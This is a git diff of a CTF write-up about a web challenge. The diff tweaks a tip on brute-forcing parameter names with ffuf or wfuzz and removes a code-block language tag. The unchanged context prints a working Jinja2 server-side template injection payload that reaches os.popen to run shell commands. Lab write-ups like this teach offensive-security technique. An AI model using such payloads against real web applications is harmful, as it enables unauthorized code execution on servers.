@@ -266,7 +266,7 @@ Initially it just seems like a static site. The source doesn't have anything int
 
 We can try usual parameters like `id`,`cmd`, `name` and a lot more. But `name` param itself worked.
 
-> We can also try to brute force using tools like `ffuf` or `wfuzz`
+> We can also try to brute force the param name by using tools like `ffuf` or `wfuzz`
 {: .prompt-tip}
 
 ![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-44.png)
@@ -277,7 +277,7 @@ And ssti payload also works in this param.
 
 We can use the following template to get direct code execution. [Refer here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) for more payload.
 
-```python
+```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
 ```
 
